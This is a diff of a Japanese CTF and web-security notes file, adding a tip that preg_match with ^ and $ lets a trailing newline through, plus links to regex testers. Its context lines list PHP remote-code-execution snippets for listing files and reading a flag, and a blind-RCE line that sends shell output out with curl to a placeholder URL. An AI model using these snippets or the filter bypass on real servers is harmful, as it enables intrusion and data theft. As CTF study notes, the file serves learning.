@@ -82,13 +82,17 @@ https://qiita.com/addictionwhite/items/4e9c9cc4570c0bcaa656
 `preg_replace`,`escapeshellcmd`,`escapeshellarg`,`filter_var`  
 https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md  
 https://gist.github.com/Zenexer/40d02da5e07f151adeaeeaa11af9ab36  
-
+  
+`preg_match`は`preg_match('/^\w+$/'`のように`^ $`と書くと、`aaa\n`でも一致する！(最後の改行も通す)  
+https://qiita.com/tadsan/items/81b2925b3ed03ae6b7e0  
+  
 以下でいろいろRCEできるときにPHPでいろいろできる。  
 - **RCE** `system("ls -la ./");`, `<?='cat /flag';`  
 - **ls** `foreach(new DirectoryIterator('glob:///*') as $f){ echo $f."\n"; }`,`print_r(scandir('./'));`,`var_dump(scandir("/var/www/html"));`  
 - **cat** `readfile(glob('*')[0]);`,`eval(system('cat /flag'));`,`show_source('./flag.txt');`,`var_dump(base64_encode(readfile("../../../flag.so")));`  
 - 定義済み配列をすべて出す `print_r(get_defined_vars())`  
 - blind RCE `$output=shell_exec(\"ls\");shell_exec(\"curl -XPOST -d'data=$output' [url]"\");`  
+  
 #### その他
 https://www.hamayanhamayan.com/entry/2020/08/09/193357  
 - `ob_start()`  
@@ -486,3 +490,7 @@ https://blog.codecamp.jp/programming-docker-image-container
 DockerコンテナとDockerイメージについて   
 https://qiita.com/hiyuzawa/items/81490020568417d85e86   
 Dockerでの基礎的な操作が大体全部かかれてる   
+http://okumocchi.jp/php/re.php  
+PHPの`preg_match`、JavaScriptの`match`関数で正規表現をチェックできる。  
+https://www.debuggex.com/  
+正規表現がどんな感じで動くかわかりやすい。  
